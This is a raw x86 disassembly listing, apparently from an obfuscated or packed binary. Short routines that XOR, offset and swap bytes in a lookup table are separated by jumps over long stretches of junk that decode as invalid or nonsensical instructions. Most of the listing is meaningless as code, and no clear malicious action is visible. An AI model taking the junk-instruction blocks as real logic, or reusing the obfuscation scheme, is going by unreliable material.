  404a7c:	mov    dl,0x8e
  404a7e:	mov    esi,0x814bd80e
  404a83:	rcr    BYTE PTR [esi+0x47e16d1f],1
  404a89:	mov    ds:0xebc85fa3,al
  404a8e:	jbe    0x404a38
  404a90:	repz adc DWORD PTR [esi-0x7c],ecx
  404a94:	sub    bl,dl
  404a96:	jbe    0x404a40
  404a98:	ins    BYTE PTR es:[edi],dx
  404a99:	dec    ebp
  404a9a:	jb     0x404aa4
  404a9c:	xor    dh,BYTE PTR [edi-0x7b]
  404a9f:	das    
  404aa0:	mov    cl,BYTE PTR [ebx]
  404aa2:	(bad)  [edi]
  404aa4:	xlat   BYTE PTR ds:[ebx]
  404aa5:	push   edi
  404aa6:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404aad:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xc73c6a28
  404b32:	mov    DWORD PTR [edi],esp
  404b34:	out    0xa2,al
  404b36:	and    bh,BYTE PTR [esi+0x7e]
  404b39:	pop    eax
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404ae0
  404b3e:	std    
  404b3f:	in     al,dx
  404b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b41:	and    DWORD PTR [esi-0x61c533a0],ecx
  404b47:	and    ebx,DWORD PTR [eax-0x221163b3]
  404b4d:	jo     0x404ad0
  404b4f:	(bad)  
  404b50:	sti    
  404b51:	and    bh,dh
  404b53:	shl    BYTE PTR [edi],1
  404b55:	push   edi
  404b56:	jae    0x404ae9
  404b58:	or     edi,DWORD PTR es:[ebx-0x4b]
  404b5c:	xor    BYTE PTR [edx+0x2a358455],cl
  404b62:	scas   al,BYTE PTR es:[edi]
  404b63:	push   esi
  404b64:	dec    edx
  404b65:	lods   eax,DWORD PTR ds:[esi]
  404b66:	sub    BYTE PTR [esi+edi*8-0x600d8e40],cl
  404b6d:	inc    esi
  404b6e:	dec    edx
  404b6f:	stos   DWORD PTR es:[edi],eax
  404b70:	call   0x780abb8c
  404b75:	(bad)  
  404b76:	mov    esp,0x76c4d874
  404b7b:	cmp    al,0x83
  404b7d:	ja     0x404bfb
  404b7f:	mov    esi,0xa9fc586
  404b84:	cdq    
  404b85:	mov    bl,0xe2
  404b87:	mov    bh,BYTE PTR [edx+0x14504bb6]
  404b8d:	test   al,0xb3
  404b8f:	inc    ebx
  404b90:	nop
  404b91:	loopne 0x404bcc
  404b93:	or     al,BYTE PTR [ecx-0x48fe4f5f]
  404b99:	xchg   edx,eax
  404b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b9b:	xchg   edx,eax
  404b9c:	push   0xffffff86
  404b9e:	add    BYTE PTR [eax],dl
  404ba0:	les    ebx,FWORD PTR ds:0x2e84a1fe
  404ba6:	out    dx,al
  404ba7:	pop    esp
  404ba8:	frstor [esp+ebp*4+0x95fe05a]
  404baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bb0:	fistp  QWORD PTR [esi]
  404bb2:	push   eax
  404bb3:	adc    BYTE PTR [ecx-0x57ccdd0b],bh
  404bb9:	mov    DWORD PTR [ecx],ebx
  404bbb:	div    DWORD PTR [esp+ebp*2+0x716600f1]
  404bc2:	cmp    eax,0x4e3a6fef
  404bc7:	inc    eax
  404bc8:	aad    0xa7
  404bca:	xchg   esi,eax
  404bcb:	mov    ch,0xfb
  404bcd:	dec    esp
  404bce:	loope  0x404ba2
  404bd0:	push   ebx
  404bd1:	inc    esi
  404bd2:	shl    BYTE PTR [edi+0x135e7ac9],cl
  404bd8:	rol    edi,1
  404bda:	dec    eax
  404bdb:	div    DWORD PTR [ebx+0x56de87d3]
  404be1:	outs   dx,DWORD PTR ds:[esi]
  404be2:	(bad)  
  404be3:	es nop
  404be5:	or     ebp,DWORD PTR [ecx]
  404be7:	(bad)  
  404be8:	lods   eax,DWORD PTR ds:[esi]
  404be9:	mov    al,0x4d
  404beb:	jne    0x404c24
  404bed:	cmp    esi,DWORD PTR [ebx+0xf]
  404bf0:	aaa    
  404bf1:	mov    WORD PTR [esi+ebp*1],ds
  404bf4:	mov    ss,ebp
  404bf6:	(bad)  
  404bf7:	mov    ecx,DWORD PTR [edx]
  404bf9:	mov    ds:0xc12769f8,eax
  404bfe:	dec    esi
  404bff:	outs   dx,DWORD PTR ds:[esi]
  404c00:	inc    edx
  404c01:	test   BYTE PTR [ebp-0x66],al
  404c04:	std    
  404c05:	jo     0x404bd7
  404c07:	stc    
  404c08:	fwait
  404c09:	and    BYTE PTR [eax],ah
  404c0b:	mov    bl,0xfa
  404c0d:	xchg   ecx,eax
  404c0e:	fcomp  QWORD PTR [ecx+0x12]
  404c11:	in     al,0xd8
  404c13:	(bad)  
  404c14:	cmp    al,0x44
  404c16:	mov    bh,0x30
  404c18:	aam    0xa3
  404c1a:	pop    esp
  404c1b:	mov    ds:0xa52e9245,eax
  404c20:	aam    0xaf
  404c22:	test   dh,bh
  404c24:	cli    
  404c25:	and    BYTE PTR [edi+0x9],bl
  404c28:	fild   QWORD PTR [ecx+esi*4+0x1cf7c524]
  404c2f:	cmp    ebp,DWORD PTR [ebp-0x384c411f]
  404c35:	pop    esp
  404c36:	jge    0x404c87
  404c38:	sbb    DWORD PTR [ebx],esp
  404c3a:	cmp    eax,0x7c7cdbfc
  404c3f:	xor    DWORD PTR [esi+0x77ef6c9c],0xed09c14f
  404c49:	sbb    bl,ch
  404c4b:	jmp    0x18df:0xf3f9cb16
  404c52:	mov    ah,dl
  404c54:	gs mov bl,0x33
  404c57:	inc    ebx
  404c58:	inc    ebp
  404c59:	cs imul ecx,esi,0x875cce86
  404c60:	xchg   DWORD PTR [esi-0x609b19a6],edx
  404c66:	jns    0x404c67
  404c68:	xor    cl,0x61
  404c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c6c:	mov    dl,0x6e
  404c6e:	repz ret 
  404c70:	in     al,0xd2
  404c72:	fstp   DWORD PTR [eax-0xf5d29b6]
  404c78:	les    eax,FWORD PTR [edi+edi*1+0x33778d57]
  404c7f:	sbb    edi,edi
  404c81:	inc    ebp
  404c82:	dec    ecx
  404c83:	popf   
  404c84:	dec    esi
  404c85:	mov    al,ds:0x6e5a9a18
  404c8a:	jmp    0x404ce3
  404c8c:	popf   
  404c8d:	sub    al,0x83
  404c8f:	cmp    eax,0x658a7015
  404c94:	lods   eax,DWORD PTR ds:[esi]
  404c95:	mov    ds:0x31911334,al
  404c9a:	int3   
  404c9b:	out    dx,al
  404c9c:	or     ebp,DWORD PTR [edx+ecx*1+0x416e74ea]
  404ca3:	push   esi
  404ca4:	lods   eax,DWORD PTR ds:[esi]
  404ca5:	es aad 0xf6
  404ca8:	sbb    DWORD PTR [edi],0xbfa3e966
  404cae:	gs sbb esi,ecx
  404cb1:	inc    ebp
  404cb2:	mov    bh,0xab
  404cb4:	fimul  DWORD PTR [ecx+0x5b1776c8]
  404cba:	loopne 0x404c60
  404cbc:	xor    eax,0xd79b6a74
  404cc1:	cdq    
  404cc2:	ds fdivp st(4),st
  404cc5:	jns    0x404ca5
  404cc7:	scas   eax,DWORD PTR es:[edi]
  404cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc9:	jb     0x404cf5
  404ccb:	lods   al,BYTE PTR ds:[esi]
  404ccc:	dec    ecx
  404ccd:	sbb    BYTE PTR [eax],dh
  404ccf:	cmp    eax,0x8eae32f1
  404cd4:	ret    
  404cd5:	imul   ebp,DWORD PTR [ecx-0x55],0xffffff96
  404cd9:	out    dx,al
  404cda:	adc    BYTE PTR [ecx],dl
  404cdc:	xlat   BYTE PTR ds:[ebx]
  404cdd:	cmc    
  404cde:	adc    al,0xac
  404ce0:	xchg   esi,eax
  404ce1:	js     0x404cbf
  404ce3:	retf   
  404ce4:	sub    al,0x23
  404ce6:	ins    BYTE PTR es:[edi],dx
  404ce7:	pop    ss
  404ce8:	out    dx,al
  404ce9:	xor    al,0x8a
  404ceb:	and    al,0x91
  404ced:	dec    esi
  404cee:	and    al,0x63
  404cf0:	push   ecx
  404cf1:	mov    gs,WORD PTR [eax]
  404cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cf4:	in     eax,0xc0
  404cf6:	aad    0x22
  404cf8:	xor    DWORD PTR [eax+0x73],esi
  404cfb:	lock mov eax,ds:0x1790828d
  404d01:	xlat   BYTE PTR cs:[ebx]
  404d03:	jge    0x404cf3
  404d05:	add    eax,0x20d703d9
  404d0a:	pop    es
  404d0b:	adc    eax,0xf0be5c1f
  404d10:	sbb    DWORD PTR [ecx+0x49],eax
  404d13:	push   0x9c3372ba
  404d18:	sbb    ecx,DWORD PTR [ecx-0x3a916578]
  404d1e:	xchg   DWORD PTR [ebp+0x20a82452],esp
  404d24:	mov    ds:0x77b50aee,eax
  404d29:	pop    ss
  404d2a:	xor    eax,0x324a98d2
  404d2f:	push   ecx
  404d30:	push   ebx
  404d31:	mov    esi,0xec63183b
  404d36:	jmp    0xce18e17
  404d3b:	les    ebx,FWORD PTR [esi+edx*1+0x51]
  404d3f:	adc    dh,BYTE PTR [edx+0x7d]
  404d42:	scas   eax,DWORD PTR es:[edi]
  404d43:	shl    BYTE PTR [ebx],1
  404d45:	sbb    DWORD PTR [edx+0x21],esi
  404d48:	push   ds
  404d49:	push   ebp
  404d4a:	cmp    DWORD PTR [edi-0x61],ebx
  404d4d:	(bad)  
  404d4e:	ret    0x563c
  404d51:	pop    es
  404d52:	dec    ebx
  404d53:	mov    fs,WORD PTR [ebx+eiz*8+0x357f7ec9]
  404d5a:	push   0xffffff80
  404d5c:	ss xor eax,0x23630135
  404d62:	jo     0x404d39
  404d64:	add    BYTE PTR [eax-0x2be4ac9f],al
  404d6a:	pop    esi
  404d6b:	int    0x6f
  404d6d:	ins    BYTE PTR es:[edi],dx
  404d6e:	push   edx
  404d6f:	mov    eax,ds:0x4aedf8dd
  404d74:	ror    ah,1
  404d76:	shl    DWORD PTR [eax],cl
  404d78:	shl    BYTE PTR [esi-0x718a1c64],0x42
  404d7f:	sti    
  404d80:	pop    edx
  404d81:	imul   esi,DWORD PTR [ebx+ebp*8+0x40],0x66
  404d86:	adc    al,ch
  404d88:	jl     0x404e04
  404d8a:	push   es
  404d8b:	test   BYTE PTR [esi+0x5acf3c9b],ch
  404d91:	cmp    DWORD PTR [ebx-0x645ecdf2],ecx
  404d97:	(bad)  
  404d98:	gs sar ah,cl
  404d9b:	inc    edi
  404d9c:	add    bh,BYTE PTR [ebx+0x93b2c14]
  404da2:	sub    eax,DWORD PTR [ecx]
  404da4:	test   BYTE PTR [ecx+0x6b],bh
  404da7:	dec    DWORD PTR [ebp+0x561564f2]
  404dad:	das    
  404dae:	inc    ecx
  404daf:	xor    eax,0x55d826e9
  404db4:	xchg   ecx,eax
  404db5:	lds    edi,FWORD PTR [esi]
  404db7:	lock lods eax,DWORD PTR ds:[esi]
  404db9:	dec    edi
  404dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dbc:	mov    DWORD PTR [ebp+0x1edd3661],ebp
  404dc2:	push   ebx
  404dc3:	ret    0x573
  404dc6:	test   BYTE PTR [eax+0x45],0xd4
  404dca:	xor    al,BYTE PTR [eax]
  404dcc:	sbb    ebx,ecx
  404dce:	mov    ebx,0x301227a0
  404dd3:	pusha  
  404dd4:	or     cl,BYTE PTR [edx]
  404dd6:	cmp    dl,BYTE PTR [edi+0x40fdb075]
  404ddc:	or     eax,0x4ec729b5
  404de1:	stos   BYTE PTR es:[edi],al
  404de2:	leave  
  404de3:	(bad)  
  404de4:	xor    dh,BYTE PTR [edi+ebx*8]
  404de7:	out    dx,al
  404de8:	ds adc esp,ecx
  404deb:	loopne 0x404e18
  404ded:	sar    dh,cl
  404def:	mov    edx,0x3b3965f1
  404df4:	mov    ebx,0x71669de0
  404df9:	inc    ebx
  404dfa:	cld    
  404dfb:	pop    esp
  404dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dfd:	push   ebp
  404dfe:	in     al,0x49
  404e00:	(bad)  
  404e01:	(bad)  
  404e02:	push   ss
  404e03:	sar    BYTE PTR ds:0x227a0bda,cl
  404e09:	jg     0x404e00
  404e0b:	mov    ebx,DWORD PTR [esi-0x1a]
  404e0e:	loopne 0x404e0b
  404e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e11:	jmp    0xa4c7507f
  404e16:	imul   ebp,DWORD PTR [ebp-0x172b80da],0x3c
  404e1d:	add    edi,eax
  404e1f:	and    ecx,edx
  404e21:	push   ebp
  404e22:	xor    eax,DWORD PTR [ebx]
  404e24:	stc    
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404ebe
  404e5e:	jmp    0x21cc6cd9
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404df0
  404e6a:	xchg   al,bl
  404e6c:	hlt    
  404e6d:	lgs    edx,FWORD PTR [esi]
  404e70:	pop    ebx
  404e71:	sbb    esi,ecx
  404e73:	mov    bh,0xba
  404e75:	addr16 pop esp
  404e77:	ins    DWORD PTR es:[edi],dx
  404e78:	xchg   edi,eax
  404e79:	mov    ds:0xaac36694,al
  404e7e:	push   ss
  404e7f:	jge    0x404e9a
  404e81:	gs inc ebp
  404e83:	dec    ecx
  404e84:	test   BYTE PTR [edi],0xcd
  404e87:	leave  
  404e88:	add    eax,0x1860c859
  404e8d:	stos   DWORD PTR es:[edi],eax
  404e8e:	div    BYTE PTR [ebp-0x36]
  404e91:	mov    ds:0x16edb70c,al
  404e96:	cld    
  404e97:	shr    BYTE PTR [ebx],0x56
  404e9a:	(bad)  
  404e9b:	xor    eax,0xfa584bf4
  404ea0:	cdq    
  404ea1:	or     edi,edx
  404ea3:	mov    esp,0x4d1e46b7
  404ea8:	xchg   ebp,eax
  404ea9:	cmp    eax,DWORD PTR [ebx+eax*2-0x36]
  404ead:	punpckhbw mm2,QWORD PTR [eax]
  404eb0:	inc    edx
  404eb1:	pop    ebp
  404eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eb3:	mov    cl,0xaa
  404eb5:	jns    0x404ef1
  404eb7:	pop    ds
  404eb8:	and    ebx,DWORD PTR [eax+0x76bf68a]
  404ebe:	fs leave 
  404ec0:	push   esi
  404ec1:	jns    0x404eaf
  404ec3:	jmp    0xb78458e3
  404ec8:	mov    al,ds:0xf1312b9a
  404ecd:	lock pop edi
  404ecf:	ret    0x724e
  404ed2:	push   ebp
  404ed3:	loopne 0x404e77
  404ed5:	leave  
  404ed6:	adc    eax,0x74975b0f
  404edb:	fs inc esp
  404edd:	fld    DWORD PTR ds:0x28eb95c4
  404ee3:	stc    
  404ee4:	dec    ebp
  404ee5:	cwde   
  404ee6:	jl     0x404f48
  404ee8:	int    0x3
  404eea:	cs ss mov esi,0xdabf14c5
  404ef1:	je     0x404ec7
  404ef3:	dec    esp
  404ef4:	or     DWORD PTR [edi],esi
  404ef6:	jmp    0x382a:0x5febc79c
  404efd:	pop    ebx
  404efe:	add    bl,al
  404f00:	sahf   
  404f01:	sbb    eax,0xf4389d50
  404f06:	xchg   esp,eax
  404f07:	mov    DWORD PTR [ebp+0xd],esi
  404f0a:	pop    es
  404f0b:	xchg   ebp,eax
  404f0c:	stos   DWORD PTR es:[edi],eax
  404f0d:	adc    eax,esi
  404f0f:	mov    ah,BYTE PTR [esi]
  404f11:	inc    edx
  404f12:	(bad)  gs:[ebp+0x3b6cbdf6]
  404f19:	mov    edi,DWORD PTR [ebp-0x38]
  404f1c:	push   ss
  404f1d:	aas    
  404f1e:	cmp    al,BYTE PTR [eax+0x3b]
  404f21:	add    eax,0x49b20f27
  404f26:	aas    
  404f27:	shr    DWORD PTR [ebx],1
  404f29:	mov    eax,ds:0xfaff519e
  404f2e:	jl     0x404f80
  404f30:	je     0x404ef2
  404f32:	repnz div BYTE PTR [ecx]
  404f35:	or     bh,BYTE PTR [ecx+ebp*2+0x2e]
  404f39:	(bad)  
  404f3a:	dec    esp
  404f3c:	mov    ds:0x499b9ea3,al
  404f41:	scas   al,BYTE PTR es:[edi]
  404f42:	loop   0x404fb3
  404f44:	pop    esp
  404f45:	jns    0x404f3e
  404f47:	mov    dl,0x5d
  404f49:	dec    edx
  404f4a:	cmp    BYTE PTR [ebp+0x338afff],ah
  404f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f51:	push   ebx
  404f52:	pop    edi
  404f53:	and    ecx,ebp
  404f55:	xchg   esi,eax
  404f56:	lds    ecx,FWORD PTR [eax-0x7f585540]
  404f5c:	and    al,0x26
  404f5e:	or     al,0x4b
  404f60:	jae    0x404f69
  404f62:	xchg   esp,eax
  404f63:	push   ebx
  404f64:	mul    BYTE PTR [edi+0x24d4b55e]
  404f6a:	imul   esi,DWORD PTR [ebx+ecx*2],0xffa41791
  404f71:	cld    
  404f72:	aaa    
  404f73:	lds    esp,FWORD PTR [edi+0x183cd98d]
  404f79:	inc    ecx
  404f7a:	(bad)  
  404f7b:	imul   BYTE PTR [edx+0x64]
  404f7e:	test   dh,bl
  404f80:	jl     0x404f08
  404f82:	or     al,dh
  404f84:	xchg   ebx,eax
  404f85:	lock dec edi
  404f87:	adc    esi,DWORD PTR [edi]
  404f89:	pop    ebp
  404f8a:	add    al,0x91
  404f8c:	push   edi
  404f8d:	xchg   BYTE PTR [eax+eiz*2+0x20],bh
  404f91:	clc    
  404f92:	fwait
  404f93:	mov    bl,0xc7
  404f95:	outs   dx,DWORD PTR gs:[esi]
  404f97:	adc    cl,BYTE PTR [esi+0x67]
  404f9a:	push   ebx
  404f9b:	xchg   esp,eax
  404f9c:	cmp    eax,DWORD PTR [eax+0x3e]
  404f9f:	fwait
  404fa0:	sub    bl,dh
  404fa2:	pusha  
  404fa3:	mov    cl,0x4c
  404fa5:	in     eax,0x60
  404fa7:	jmp    0x404f79
  404fa9:	add    al,0xf7
  404fab:	mov    esp,esp
  404fad:	and    BYTE PTR gs:[ecx-0x389dfe2b],al
  404fb4:	jno    0x404f4d
  404fb6:	shr    BYTE PTR [esi+0xe],1
  404fb9:	enter  0xe98,0xa9
  404fbd:	out    0xc6,al
  404fbf:	sti    
  404fc0:	sbb    eax,0x3a0125c4
  404fc5:	cmp    ch,ch
  404fc7:	test   DWORD PTR [edx+0x5368c57],ecx
  404fcd:	sbb    DWORD PTR [edx],edx
  404fcf:	div    BYTE PTR [esi-0x1a470e55]
  404fd5:	mov    ds:0xb7330e01,eax
  404fda:	rcl    ch,0x26
  404fdd:	jno    0x404fc3
  404fdf:	add    ch,BYTE PTR [edi+0x6b]
  404fe2:	push   ebp
  404fe3:	dec    esi
  404fe4:	and    ecx,DWORD PTR [ebx+0xacd6941]
  404fea:	xchg   esi,eax
  404feb:	mov    eax,ds:0x185c6bfa
  404ff0:	push   esi
  404ff1:	adc    al,0x73
  404ff3:	outs   dx,BYTE PTR ds:[esi]
  404ff4:	mov    bl,BYTE PTR [ecx+0x70ae5800]
  404ffa:	sbb    BYTE PTR [eax+0xc],dl
  404ffd:	or     BYTE PTR [esi],dl
  404fff:	aad    0x75
  405001:	jecxz  0x405070
  405003:	xor    eax,0x18bd03ab
  405008:	mov    bh,0xca
  40500a:	cmp    DWORD PTR ds:0xb1a368f8,0xfffffffb
  405011:	push   ebp
  405012:	push   0x7e7a8a81
  405017:	sub    BYTE PTR [esi],cl
  405019:	jne    0x405087
  40501b:	(bad)  
  40501d:	test   eax,esp
  40501f:	add    BYTE PTR [esi-0x4b],ah
  405022:	ds int3 
  405024:	imul   ebp,DWORD PTR [esi-0x55],0xc967c886
  40502b:	xor    ebp,esp
  40502d:	lods   eax,DWORD PTR ds:[esi]
  40502e:	or     DWORD PTR [eax-0x3a3133a6],edx
  405034:	xchg   DWORD PTR [edi],eax
  405036:	lods   al,BYTE PTR ds:[esi]
  405037:	xor    esp,DWORD PTR [edi+0x38]
  40503a:	cmp    eax,0x895e31e9
  40503f:	add    BYTE PTR [ebx+eax*4+0x12],dh
  405043:	inc    ecx
  405044:	loopne 0x404fd6
  405046:	call   0x9eb1:0xace1fed3
  40504d:	std    
  40504e:	(bad)  
  40504f:	fwait
  405050:	aam    0xeb
  405052:	stos   DWORD PTR es:[edi],eax
  405053:	jmp    0x562ad6e0
  405058:	hlt    
  405059:	jle    0x405060
  40505b:	daa    
  40505c:	test   al,0x15
  40505e:	adc    al,0xc0
  405060:	and    ah,bl
  405062:	mov    edi,0x880cf5c2
  405067:	icebp  
  405068:	xor    al,0x9f
  40506a:	xchg   edx,eax
  40506b:	sbb    DWORD PTR [edx],0x4d
  40506e:	std    
  40506f:	jnp    0x40505a
  405071:	outs   dx,DWORD PTR ds:[esi]
  405072:	mov    BYTE PTR ds:0xb2215e00,ch
  405078:	pop    edx
  405079:	or     al,BYTE PTR [ebp-0x5b]
  40507c:	sub    ebx,DWORD PTR [edx+eiz*4+0x27aaa633]
  405083:	daa    
  405084:	pop    edx
  405085:	arpl   dx,cx
  405087:	retf   0x8ef3
  40508a:	or     al,0xd2
  40508c:	mov    bh,0xb6
  40508e:	adc    eax,0x3873221d
  405093:	jno    0x405035
  405095:	rdpmc  
  405097:	mov    esi,0x9a9d6b03
  40509c:	into   
  40509d:	or     eax,0xf9f48b94
  4050a2:	(bad)  
  4050a3:	jns    0x4050d3
  4050a5:	adc    DWORD PTR [edx+0x6b],ebx
  4050a8:	repz cmp eax,DWORD PTR [ecx+0xa]
  4050ac:	add    ebx,esi
  4050ae:	add    al,dh
  4050b0:	cli    
  4050b1:	inc    edi
  4050b2:	push   es
  4050b3:	cmp    bl,BYTE PTR [esi+ebx*4+0x7a1f9e08]
  4050ba:	pop    esi
  4050bb:	rcl    ecx,0x13
  4050be:	inc    esi
  4050bf:	inc    ebp
  4050c0:	(bad)  
  4050c1:	push   cs
  4050c2:	(bad)  
  4050c3:	jmp    0x37fe:0xe6f07ef9
  4050ca:	or     al,0x24
  4050cc:	mov    dh,0xc9
  4050ce:	push   esi
  4050cf:	jno    0x4050f1
  4050d1:	mov    ds,WORD PTR [ebx+0x5b]
  4050d4:	mov    esi,0xfbd3598a
  4050d9:	iret   
  4050da:	scas   al,BYTE PTR es:[edi]
  4050db:	sti    
  4050dc:	mov    esi,0x93656a70
  4050e1:	sbb    al,BYTE PTR [edx+0x68]
  4050e4:	and    esp,DWORD PTR [esi-0x7c]
  4050e7:	fwait
  4050e8:	push   esp
  4050e9:	sar    DWORD PTR [ebx+eiz*2],0xbf
  4050ed:	dec    ebx
  4050ee:	or     BYTE PTR [ecx+0x44],dl
  4050f1:	inc    ebp
  4050f2:	pop    esp
  4050f3:	in     eax,dx
  4050f4:	ret    0xdcc4
  4050f7:	inc    esp
  4050f8:	(bad)  
  4050fa:	repz ret 0x9524
  4050fe:	fs push 0x1f
  405101:	add    ebx,ebx
  405103:	mov    dl,0xc9
  405105:	rol    ah,cl
  405107:	xlat   BYTE PTR ds:[ebx]
  405108:	cmp    edi,DWORD PTR [esi-0x5b]
  40510b:	jg     0x4050fd
  40510d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40510e:	xchg   ecx,eax
  40510f:	fistp  QWORD PTR [esi+0x4]
  405112:	adc    al,0x99
  405114:	test   al,0xf6
  405116:	mov    bh,0x8b
  405118:	leave  
  405119:	fwait
  40511a:	lods   al,BYTE PTR ds:[esi]
  40511b:	arpl   WORD PTR [eax+0x5c],ax
  40511e:	popa   
  40511f:	and    esi,DWORD PTR [edi+0x2]
  405122:	arpl   bx,bx
  405124:	sub    eax,0x4292e88d
  405129:	sbb    al,0x7a
  40512b:	in     al,0x12
  40512d:	adc    eax,0xd0a488b1
  405132:	pushf  
  405133:	xor    bh,BYTE PTR [esi]
  405135:	fs dec edi
  405137:	ss jns 0x405159
  40513a:	xor    al,0x29
  40513c:	push   ss
  40513d:	or     al,0xe
  40513f:	xchg   esp,eax
  405140:	jge    0x405124
  405142:	mov    dh,BYTE PTR [esi]
  405144:	in     al,dx
  405145:	retf   
  405146:	arpl   dx,bx
  405148:	sbb    eax,0x3e4aea0b
  40514d:	push   ds
  40514e:	push   ecx
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405172:	pop    edx
  405173:	push   0x1b
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051e9
  40517e:	jne    0x405140
  405180:	js     0x4051d6
  405182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405183:	out    dx,al
  405184:	mov    ecx,0xec7b784e
  405189:	and    eax,0x503179f4
  40518e:	mov    ch,al
  405190:	outs   dx,DWORD PTR ds:[esi]
  405191:	pop    ecx
  405192:	pop    ss
  405193:	lahf   
  405194:	rcl    BYTE PTR [edi],cl
  405196:	or     eax,0xbca3402f
  40519b:	add    BYTE PTR [ecx+0x7e],dl
  40519e:	lock or al,BYTE PTR [eax]
  4051a1:	pop    edx
  4051a2:	push   esi
  4051a3:	pop    ebp
  4051a4:	in     al,0x94
  4051a6:	loopne 0x405184
  4051a8:	cmp    ch,BYTE PTR [edi-0x5f]
  4051ab:	push   0x42be7cf1
  4051b0:	push   ecx
  4051b1:	dec    edi
  4051b2:	out    0xd3,al
  4051b4:	popa   
  4051b5:	and    edx,edx
  4051b7:	test   BYTE PTR ds:0x9c8521da,cl
  4051bd:	sti    
  4051be:	push   eax
  4051bf:	dec    edi
  4051c0:	pushf  
  4051c1:	das    
  4051c2:	inc    edi
  4051c3:	rcl    BYTE PTR [edi+0xb69d22e],1
  4051c9:	or     DWORD PTR [edi-0xc8b5a71],esi
  4051cf:	lods   eax,DWORD PTR ds:[esi]
  4051d0:	add    cl,al
  4051d2:	cs cmp esi,edi
  4051d5:	push   es
  4051d6:	jmp    0xdf76:0x7634247
  4051dd:	mov    bh,0xe3
  4051df:	cs cwde 
  4051e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051e2:	inc    ebp
  4051e3:	sbb    BYTE PTR [edi-0x6e],al
  4051e6:	mov    al,0x89
  4051e8:	jmp    0x8d1f:0x30ca1ea3
  4051ef:	mov    ebp,0x4dd983f9
  4051f4:	push   ebp
  4051f5:	push   ss
  4051f6:	adc    BYTE PTR [ecx],al
  4051f8:	xor    BYTE PTR [esi],dh
  4051fa:	dec    eax
  4051fb:	sbb    DWORD PTR [esp+eax*4],0x6e
  4051ff:	dec    ecx
  405200:	push   es
  405201:	test   al,0x49
  405203:	loop   0x405260
  405205:	inc    edi
  405206:	add    edx,DWORD PTR [ebp+ebx*8-0x33]
